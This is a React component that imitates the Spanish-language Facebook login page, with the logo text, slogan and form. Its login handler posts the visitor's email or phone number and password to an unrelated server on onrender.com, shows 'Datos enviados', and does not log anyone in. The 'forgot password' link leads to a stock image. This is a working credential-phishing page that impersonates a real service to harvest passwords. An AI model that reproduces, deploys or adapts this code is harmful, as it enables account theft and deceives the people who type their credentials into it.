import React, { useState } from 'react';
import './App.css';
import axios from 'axios';
import Footer from './Footer';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      await axios.post('https://prueba-vhm0.onrender.com/api/login', { email, password });
      alert('Datos enviados');
      setEmail('');
      setPassword('');
    } catch (error) {
      alert('Error al enviar datos');
    }
  };

  return (
    <>
      <div className="main-container">
        <div className="left-panel">
          <h1 className="logo">facebook</h1>
          <h2 className="slogan">
            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
          </h2>
        </div>

        <div className="right-panel">
          <form className="login-box" onSubmit={handleLogin}>
            <input
              type="text"
              placeholder="Correo electrónico o número de teléfono"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Contraseña"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" className="login-btn">Iniciar sesión</button>
            <a href="https://static.vecteezy.com/system/resources/previews/004/217/024/non_2x/world-planet-earth-free-vector.jpg" className="forgot-password">¿Has olvidado la contraseña?</a>
            <hr />
            <button type="button" className="create-account-btn">Crear una cuenta</button>
          </form>
          <p className="create-page-text">
            <strong>Crea una página</strong> para un famoso, una marca o una empresa.
          </p>
        </div>
      </div>

      {/* El Footer se renderiza fuera del main-container */}
      <Footer />
    </>
  );
}

export default App;
